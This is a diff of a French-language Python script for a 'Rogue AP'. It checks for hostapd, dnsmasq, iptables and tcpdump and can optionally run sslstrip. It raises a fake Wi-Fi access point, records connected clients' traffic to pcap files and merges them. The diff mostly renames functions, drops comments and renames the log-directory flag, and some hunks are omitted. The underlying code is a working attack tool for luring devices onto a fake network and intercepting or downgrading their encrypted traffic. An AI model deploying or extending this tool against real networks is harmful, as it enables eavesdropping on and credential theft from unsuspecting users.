@@ -6,9 +6,9 @@ import os
 import tempfile
 import shutil
 
-###############################
+#############################
 ########## Arguments ##########
-###############################
+#############################
 
 parser = argparse.ArgumentParser()
 parser.add_argument("wlanInterface", help="L'interface en mode moniteur", type=str)
@@ -17,94 +17,85 @@ parser.add_argument("--ssid", help="SSID du réseau", type=str, required=True)
 parser.add_argument("--wpa", help="Phrase de passe WPA du réseau", type=str, required=True)
 parser.add_argument("--channel", help="Canal à utiliser", type=int, required=True)
 parser.add_argument("--sslstrip", help="Utiliser sslstrip", action="store_true")
-parser.add_argument("--logdir", help="Répertoire pour sauvegarder les données capturées", type=str, default=".")
+parser.add_argument("--logDir", help="Répertoire pour sauvegarder les données capturées", type=str, default=".")
 args = parser.parse_args()
 
-################################
-######### Vérifications ########
-################################
+#############################
+########## Vérifications #########
+#############################
 
 def die(message):
-    # Afficher un message d'erreur et quitter le programme
     sys.stderr.write("%s\n" % message)
     exit(1)
 
-def checkSslstrip():
-    # Vérifier si sslstrip est installé et exécutable
+def check_sslstrip():
     try:
         return not subprocess.call(["sslstrip", "--help"], stdout=null, stderr=null)
     except:
         return False
 
-def checkHostapd():
-    # Vérifier si hostapd est installé et exécutable
+def check_hostapd():
     try:
         return subprocess.call(["hostapd", "--help"], stdout=null, stderr=null) != 127
     except:
         return False
 
-def checkDnsmasq():
-    # Vérifier si dnsmasq est installé et exécutable
+def check_dnsmasq():
     try:
         return not subprocess.call(["dnsmasq", "--help"], stdout=null, stderr=null)
     except:
         return False
 
-def checkTcpdump():
-    # Vérifier si tcpdump est installé et exécutable
+def check_tcpdump():
     try:
         return subprocess.call(["tcpdump", "--help"], stdout=null, stderr=null) != 127
     except:
         return False
 
-def checkIptables():
-    # Vérifier si iptables est installé et exécutable
+def check_iptables():
     try:
         return not subprocess.call(["iptables", "--help"], stdout=null, stderr=null)
     except:
         return False
 
-def checkIp():
-    # Vérifier si la commande ip est installée et exécutable
+def check_ip():
     try:
         return not subprocess.call(["ip", "link", "show"], stdout=null, stderr=null)
     except:
         return False
 
-def checkMergecap():
-    # Vérifier si mergecap est installé et exécutable
+def check_mergecap():
     try:
         return subprocess.call(["mergecap", "--help"], stdout=null, stderr=null) != 127
     except:
         return False
 
-def pollIfaceExists(iface):
-    # Vérifier si une interface réseau existe
+def poll_iface_exists(iface):
     return not subprocess.call(["ip", "link", "show", iface], stdout=null, stderr=null)
 
 null = open("/dev/null", "w")
 
 if os.geteuid(): die("Vous devez être root")
-if not checkIp(): die("Commande ip absente ou cassée")
-if not checkTcpdump(): die("Commande tcpdump absente ou cassée")
-if not checkMergecap(): die("Commande mergecap absente ou cassée")
-if not checkIptables(): die("iptables absent ou cassé")
-if not checkDnsmasq(): die("Commande dnsmasq absente ou cassée")
-if not checkHostapd(): die("Commande hostapd absente ou cassée")
-if args.sslstrip and not checkSslstrip(): die("Commande sslstrip absente ou cassée")
+if not check_ip(): die("Commande ip absente ou cassée")
+if not check_tcpdump(): die("Commande tcpdump absente ou cassée")
+if not check_mergecap(): die("Commande mergecap absente ou cassée")
+if not check_iptables(): die("iptables absent ou cassé")
+if not check_dnsmasq(): die("Commande dnsmasq absente ou cassée")
+if not check_hostapd(): die("Commande hostapd absente ou cassée")
+if args.sslstrip and not check_sslstrip(): die("Commande sslstrip absente ou cassée")
 
-if not pollIfaceExists(args.wlanInterface): die("%s n'est pas une interface valide" % args.wlanInterface)
-if not pollIfaceExists(args.inetInterface): die("%s n'est pas une interface valide" % args.inetInterface)
+if not poll_iface_exists(args.wlanInterface): die("%s n'est pas une interface valide" % args.wlanInterface)
+if not poll_iface_exists(args.inetInterface): die("%s n'est pas une interface valide" % args.inetInterface)
 if (len(args.wpa) < 8) or (len(args.wpa) > 63): die("La phrase de passe WPA doit contenir entre 8 et 63 caractères")
 
-#################################
-########## Configuration ########
-#################################
+#############################
+########## Configuration #########
+#############################
 
 logTempDir = tempfile.mkdtemp()
 logPcapDir = os.path.join(logTempDir, "pcap")
 os.makedirs(logPcapDir, exist_ok=True)
-os.makedirs(args.logdir, exist_ok=True)
+os.makedirs(args.logDir, exist_ok=True)
 
 print("Démarrage du Rogue AP\n")
 print("En cours d'exécution")
@@ -140,15 +131,14 @@ with os.fdopen(n, "w") as f:
     f.write("no-hosts\n")
     f.write("addn-hosts=/dev/null\n")
 
-def nukeAll(popenList):
-    # Terminer tous les processus de la liste
+def nuke_all(popenList):
     for popen in popenList:
         if popen.poll() is None:
             popen.kill()
     popenList.clear()
 
 #############################
-#### Boucle principale ######
+########## Boucle principale #########
 #############################
 
 try:
@@ -162,7 +152,7 @@ try:
         pids.append(p)
 
         print(f"Attente de l'apparition de l'interface '{iface}'")
-        while not pollIfaceExists(iface):
+        while not poll_iface_exists(iface):
             time.sleep(0.01)
 
         subprocess.call(["ifconfig", iface, "10.55.66.1", "netmask", "255.255.255.0", "up"])
@@ -184,23 +174,23 @@ try:
             time.sleep(0.01)
 
         print("Un programme de la chaîne a échoué, redémarrage de la chaîne...\n")
-        nukeAll(pids)
+        nuke_all(pids)
 
 except KeyboardInterrupt:
     pass
 
-##############################
+#############################
 ########## Nettoyage #########
-##############################
+#############################
 
 print("Arrêt du Rogue AP")
-nukeAll(pids)
+nuke_all(pids)
 
 pcapFiles = [os.path.join(logPcapDir, f) for f in os.listdir(logPcapDir)
               if os.path.isfile(os.path.join(logPcapDir, f))]
 
 if pcapFiles:
-    outputPcap = os.path.join(args.logdir, "capture.pcap")
+    outputPcap = os.path.join(args.logDir, "capture.pcap")
     subprocess.call(["mergecap", "-w", outputPcap] + pcapFiles, stdout=null, stderr=null)
     print(f"Captures fusionnées dans {outputPcap}")
 else:
